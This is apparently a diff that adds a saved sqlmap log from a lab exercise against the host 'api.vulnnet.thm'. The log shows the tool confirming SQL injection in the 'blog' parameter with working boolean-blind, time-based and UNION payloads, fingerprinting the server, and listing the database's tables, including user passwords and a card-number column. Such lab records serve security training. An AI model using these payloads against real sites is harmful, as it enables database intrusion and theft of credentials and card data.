@@ -1,0 +1,138 @@
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.6.7#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:10:47 /2022-12-16/
+
+[20:10:47] [INFO] testing connection to the target URL
+[20:10:47] [INFO] checking if the target is protected by some kind of WAF/IPS
+[20:10:47] [INFO] testing if the target URL content is stable
+[20:10:48] [INFO] target URL content is stable
+[20:10:48] [INFO] testing if GET parameter 'blog' is dynamic
+[20:10:48] [INFO] GET parameter 'blog' appears to be dynamic
+[20:10:48] [WARNING] reflective value(s) found and filtering out
+[20:10:48] [INFO] heuristic (basic) test shows that GET parameter 'blog' might be injectable
+[20:10:48] [INFO] testing for SQL injection on GET parameter 'blog'
+[20:10:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[20:10:51] [INFO] GET parameter 'blog' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[20:10:55] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] [20:11:01] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[20:11:01] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[20:11:01] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[20:11:01] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[20:11:02] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[20:11:02] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[20:11:02] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[20:11:02] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[20:11:03] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[20:11:03] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[20:11:03] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[20:11:03] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[20:11:03] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[20:11:03] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[20:11:04] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[20:11:04] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[20:11:04] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[20:11:05] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[20:11:05] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[20:11:05] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[20:11:05] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
+[20:11:06] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
+[20:11:06] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[20:11:06] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
+[20:11:06] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[20:11:06] [INFO] testing 'Generic inline queries'
+[20:11:07] [INFO] testing 'MySQL inline queries'
+[20:11:07] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[20:11:07] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[20:11:07] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[20:11:08] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[20:11:08] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[20:11:08] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[20:11:08] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[20:11:19] [INFO] GET parameter 'blog' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[20:11:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[20:11:19] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[20:11:19] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[20:11:20] [INFO] target URL appears to have 3 columns in query
+[20:11:21] [INFO] GET parameter 'blog' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'blog' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 82 HTTP(s) requests:
+---
+Parameter: blog (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: blog=5 AND 6105=6105
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: blog=5 AND (SELECT 7521 FROM (SELECT(SLEEP(5)))wlWw)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: blog=-3139 UNION ALL SELECT NULL,NULL,CONCAT(0x7176717671,0x6e626241765467685a78777164596879714d6a5a6d7547467742565558637078594352526b585142,0x717a707871)-- -
+---
+[20:11:26] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 18.04 (bionic)
+web application technology: Apache 2.4.29
+back-end DBMS: MySQL >= 5.0.12
+[20:11:27] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns
+[20:11:27] [INFO] fetching current database
+[20:11:28] [INFO] fetching tables for database: 'blog'
+[20:11:28] [INFO] fetching columns for table 'users' in database 'blog'
+[20:11:28] [INFO] fetching columns for table 'details' in database 'blog'
+[20:11:28] [INFO] fetching columns for table 'blog_posts' in database 'blog'
+[20:11:28] [INFO] fetching columns for table 'metadata' in database 'blog'
+Database: blog
+Table: users
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | int(11)     |
+| password | varchar(50) |
+| username | varchar(50) |
++----------+-------------+
+
+Database: blog
+Table: details
+[4 columns]
++------------+-------------+
+| Column     | Type        |
++------------+-------------+
+| cc         | varchar(50) |
+| city       | varchar(50) |
+| first_name | varchar(50) |
+| id         | int(11)     |
++------------+-------------+
+
+Database: blog
+Table: blog_posts
+[3 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| id     | int(11)      |
+| status | varchar(50)  |
+| titles | varchar(256) |
++--------+--------------+
+
+Database: blog
+Table: metadata
+[3 columns]
++---------+-------------+
+| Column  | Type        |
++---------+-------------+
+| browser | varchar(50) |
+| flag    | int(11)     |
+| id      | int(11)     |
++---------+-------------+
+
+[20:11:29] [INFO] fetched data logged to text files under '/home/divu050704/.local/share/sqlmap/output/api.vulnnet.thm'
+
+[*] ending @ 20:11:29 /2022-12-16/
+
